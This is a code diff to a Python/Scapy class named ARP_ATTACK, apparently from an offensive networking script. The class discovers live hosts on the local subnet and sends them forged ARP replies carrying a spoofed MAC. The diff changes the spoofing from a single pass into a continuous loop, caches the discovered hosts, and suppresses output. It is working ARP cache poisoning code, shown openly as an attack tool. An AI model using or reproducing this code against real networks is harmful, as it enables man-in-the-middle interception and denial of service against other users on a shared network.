@@ -55,7 +55,7 @@ class ARP_ATTACK(Process):
                  arp_mac=None,
                  target_host=None,
                  ifname='eth1',
-                 sleeptime=0,
+                 sleeptime=2,
                  timeout=5,
                  *arg, **kwargs):
         ''' init '''
@@ -94,17 +94,24 @@ class ARP_ATTACK(Process):
 
     # get ips alive in the line
     def get_host(self):
+        if hasattr(self, 'hostlist'):
+            return self.hostlist
+
         hostip = self.get_ipaddress()
         mask = str(self.get_netmask())
         res = arping(
             hostip + '/' + mask, timeout=self.timeout, iface=self.ifname)
-        hostlist = {}
+        self.hostlist = {}
         for eachenty in res[0].res:
             ip = eachenty[0].pdst
-            hostlist[ip] = eachenty[1].src
-        return hostlist
+            self.hostlist[ip] = eachenty[1].src
+
+        #print(self.hostlist)
+
+        return self.hostlist
 
     def get_ipaddress(self):
+        ''' 获取本机ip'''
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         return socket.inet_ntoa(fcntl.ioctl(
             s.fileno(),
@@ -140,24 +147,34 @@ class ARP_ATTACK(Process):
         return n
 
     def arp_hack(self, arp_ip, dsthw, dstip):
-        t = ARP(op=2,
-                hwsrc=self.arp_mac,
-                psrc=arp_ip,
-                hwdst=dsthw,
-                pdst=dstip)
-        send(t, iface=self.ifname)
+
+        #stdout = sys.stdout
+        try:
+            t = ARP(op=2,
+                    hwsrc=self.arp_mac,
+                    psrc=arp_ip,
+                    hwdst=dsthw,
+                    pdst=dstip)
+            null = open('/dev/null', 'w')
+            sys.stdout = null
+            send(t, iface=self.ifname)
+        except KeyboardInterrupt:
+            pass
 
     def run(self):
-
-        for arp_ip in self.arp_ip:
-            for dstip, dsthw in self.target_host.iteritems():
-                self.arp_hack(arp_ip, dsthw, dstip)
+        try:
+            while True:
+                for arp_ip in self.arp_ip:
+                    for dstip, dsthw in self.target_host.iteritems():
+                        # null = open('/dev/null', 'w')
+                        # sys.stdout = null
+                        self.arp_hack(arp_ip, dsthw, dstip)
+                        time.sleep(self.sleeptime)
                 time.sleep(self.sleeptime)
-        time.sleep(self.sleeptime)
-
-
+        except KeyboardInterrupt:
+            pass
 if __name__ == '__main__':
-    attack = ARP_ATTACK(ifname='wlan0')
+    attack = ARP_ATTACK(ifname='br0')
     attack.start()
     time.sleep(10)
     attack.stop()
